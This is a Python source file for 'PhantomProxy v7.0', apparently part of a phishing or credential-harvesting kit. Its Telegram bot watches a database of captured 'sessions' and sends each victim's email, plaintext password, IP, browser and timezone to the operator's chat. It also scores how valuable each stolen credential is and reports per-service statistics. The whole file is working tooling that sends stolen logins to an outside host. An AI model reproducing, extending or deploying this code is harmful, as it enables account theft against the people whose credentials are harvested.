#!/usr/bin/env python3
"""
PhantomProxy v7.0 - Telegram Bot Integration
- Мгновенные уведомления о новых сессиях
- Команды: /start, /stats, /sessions, /help
- Real-time уведомления
"""

import requests
import sqlite3
import time
import os
from datetime import datetime, timedelta

# Конфигурация
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')
DB_PATH = '/home/ubuntu/phantom-proxy/phantom.db'

class TelegramBot:
    def __init__(self):
        self.last_session_id = 0
        self.api_url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}'
        self.enabled = bool(TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID)
        
        if not self.enabled:
            print('⚠️ Telegram not configured. Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID')
    
    def get_db(self):
        conn = sqlite3.connect(DB_PATH)
        conn.row_factory = sqlite3.Row
        return conn
    
    def get_last_session_id(self):
        try:
            conn = self.get_db()
            c = conn.cursor()
            c.execute('SELECT MAX(id) FROM sessions')
            result = c.fetchone()[0]
            conn.close()
            return result or 0
        except:
            return 0
    
    def get_new_sessions(self):
        try:
            conn = self.get_db()
            c = conn.cursor()
            c.execute('SELECT * FROM sessions WHERE id > ? ORDER BY id DESC', (self.last_session_id,))
            sessions = c.fetchall()
            conn.close()
            return sessions
        except:
            return []
    
    def send_message(self, message, parse_mode='HTML'):
        """Отправка сообщения в Telegram"""
        if not self.enabled:
            print(f'📤 Would send: {message[:100]}...')
            return False
        
        try:
            url = f'{self.api_url}/sendMessage'
            data = {
                'chat_id': TELEGRAM_CHAT_ID,
                'text': message,
                'parse_mode': parse_mode,
                'disable_web_page_preview': True
            }
            response = requests.post(url, json=data, timeout=10)
            result = response.json()
            
            if result.get('ok'):
                print(f'✅ Message sent')
                return True
            else:
                print(f'❌ Error: {result}')
                return False
        except Exception as e:
            print(f'❌ Exception: {e}')
            return False
    
    def format_session(self, session):
        """Форматирование сессии для уведомления"""
        quality = self.calculate_quality(session)
        
        emoji = {'EXCELLENT': '🏆', 'GOOD': '✅', 'AVERAGE': '⚠️', 'LOW': '❌'}
        
        message = f"""
{emoji.get(quality['classification'], '🎯')} <b>НОВАЯ СЕССИЯ!</b>

📧 <b>Email:</b> <code>{session['email']}</code>
🔑 <b>Password:</b> <code>{session['password']}</code>
🏢 <b>Service:</b> {session['service']}
🌐 <b>IP:</b> <code>{session['ip']}</code>
📱 <b>Browser:</b> {session['user_agent'][:50]}...
🖥️ <b>Screen:</b> {session['screen_resolution']}
🕐 <b>Timezone:</b> {session['timezone']}
⭐ <b>Quality:</b> {quality['classification']} ({quality['score']}/100)
⏰ <b>Time:</b> {session['created_at']}

#PhantomProxy #NewSession #{session['service'].replace(' ', '')}
"""
        return message
    
    def calculate_quality(self, session):
        """Расчёт качества сессии"""
        score = 0
        
        if session.get('email'): score += 20
        if session.get('password'): score += 30
        if session.get('user_agent'): score += 15
        if session.get('screen_resolution'): score += 10
        if session.get('timezone'): score += 10
        if session.get('ip') and session['ip'] != 'unknown': score += 15
        
        if score >= 80: classification = 'EXCELLENT'
        elif score >= 60: classification = 'GOOD'
        elif score >= 40: classification = 'AVERAGE'
        else: classification = 'LOW'
        
        return {'score': score, 'classification': classification}
    
    def get_stats_message(self):
        """Получение статистики для команды /stats"""
        try:
            conn = self.get_db()
            c = conn.cursor()
            
            c.execute('SELECT COUNT(*) FROM sessions')
            total = c.fetchone()[0]
            
            c.execute('SELECT COUNT(*) FROM sessions WHERE datetime(created_at) > datetime("now", "-1 day")')
            today = c.fetchone()[0]
            
            c.execute('SELECT COUNT(*) FROM sessions WHERE datetime(created_at) > datetime("now", "-7 days")')
            week = c.fetchone()[0]
            
            c.execute('SELECT service, COUNT(*) as count FROM sessions GROUP BY service ORDER BY count DESC LIMIT 5')
            top_services = c.fetchall()
            
            conn.close()
            
            services_text = '\n'.join([f"• {s[0]}: {s[1]}" for s in top_services])
            
            message = f"""
📊 <b>PhantomProxy Statistics</b>

📈 <b>Overview:</b>
• Total: {total}
• Today: {today}
• This Week: {week}

🏢 <b>Top Services:</b>
{services_text}

⏰ <b>Updated:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
            return message
        except Exception as e:
            return f'❌ Error getting stats: {e}'
    
    def handle_command(self, command):
        """Обработка команд"""
        if command == '/start':
            return """
👋 <b>Welcome to PhantomProxy Bot!</b>

🤖 <b>Available Commands:</b>
/stats - Показать статистику
/sessions - Последние сессии
/help - Помощь

🔔 <b>Real-time notifications are enabled!</b>

You will receive instant notifications about new sessions.
"""
        
        elif command == '/stats':
            return self.get_stats_message()
        
        elif command == '/sessions':
            try:
                conn = self.get_db()
                c = conn.cursor()
                c.execute('SELECT * FROM sessions ORDER BY created_at DESC LIMIT 5')
                sessions = c.fetchall()
                conn.close()
                
                if not sessions:
                    return '📭 No sessions yet'
                
                message = '📋 <b>Last 5 Sessions:</b>\n\n'
                for s in sessions:
                    message += f"• {s['email']} | {s['service']}\n"
                
                return message
            except:
                return '❌ Error getting sessions'
        
        elif command == '/help':
            return """
📖 <b>PhantomProxy Bot Help</b>

<b>Commands:</b>
/start - Start the bot
/stats - Show statistics
/sessions - Last 5 sessions
/help - This help message

<b>Features:</b>
• Real-time notifications
• Quality scoring
• Service statistics

<b>Support:</b> @phantom_support
"""
        
        return '❓ Unknown command. Use /help'
    
    def check_and_notify(self):
        """Проверка и отправка уведомлений"""
        current_id = self.get_last_session_id()
        
        if current_id > self.last_session_id:
            sessions = self.get_new_sessions()
            
            for session in sessions:
                message = self.format_session(dict(session))
                self.send_message(message)
                print(f'✅ Notification sent for session {session["id"]}')
            
            self.last_session_id = current_id
    
    def run(self):
        """Запуск бота"""
        print('🤖 Telegram Bot started')
        
        if not self.enabled:
            print('⚠️ Bot not configured. Set environment variables.')
            print('📝 Demo mode active')
        
        self.last_session_id = self.get_last_session_id()
        print(f'Last session ID: {self.last_session_id}')
        
        while True:
            self.check_and_notify()
            time.sleep(10)

if __name__ == '__main__':
    bot = TelegramBot()
    bot.run()
